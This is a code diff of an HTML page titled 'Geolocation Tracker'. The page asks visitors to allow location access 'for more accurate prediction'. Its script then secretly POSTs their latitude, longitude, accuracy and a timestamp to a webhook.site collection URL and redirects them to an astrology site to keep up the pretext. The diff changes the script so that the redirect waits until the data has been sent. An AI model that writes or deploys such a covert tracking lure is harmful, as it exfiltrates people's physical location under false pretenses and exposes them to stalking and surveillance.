@@ -1,33 +1,48 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Geolocation Tracker</title>
+    <title>Geolocation Tracker</title>
 </head>
 <body>
-  <p>Allow location for more accurate prediction</p>
-
-  <script>
+    <p>Allow location for more accurate prediction</p>
+    
+    <script>
     navigator.geolocation.getCurrentPosition(function(position) {
-console.log("Lat:", position.coords.latitude);
-console.log("Lng:", position.coords.longitude);
-fetch("https://webhook.site/22076a52-cc9b-42d9-9fac-b4fe19c7e334", {
-        method: "POST",
-  headers: {
-    "Content-Type": "application/json"
-  },
-  body: JSON.stringify({
-    latitude: position.coords.latitude,
-    longitude: position.coords.longitude,
-    accuracy: position.coords.accuracy,
-    timestamp: new Date().toISOString()
+        console.log("Lat:", position.coords.latitude);
+        console.log("Lng:", position.coords.longitude);
+
+        const data = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            timestamp: new Date().toISOString()
+        };
+
+        fetch("https://webhook.site/72207e62-cc9b-42d9-9fac-b4fe19c7e334", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(data)
         })
-      });
-      setTimeout(() => {
-        window.location.href = "https://www.astro.com/horoscope";
-      }, 2000);
+        .then(response => {
+            // Log respons dari webhook untuk debugging
+            console.log("Webhook response:", response.status, response.statusText);
+            
+            // Redirect SETELAH fetch selesai
+            window.location.href = "https://www.astro.com/horoscope";
+        })
+        .catch(error => {
+            // Tangani jika fetch gagal
+            console.error("Fetch error:", error);
+            
+            // Anda bisa tetap redirect di sini jika mau
+            // window.location.href = "https://www.astro.com/horoscope";
+        });
+
     }, function(error) {
-      console.error("Geolocation error:", error);
+        console.error("Geolocation error:", error);
     });
-  </script>
+    </script>
 </body>
 </html>
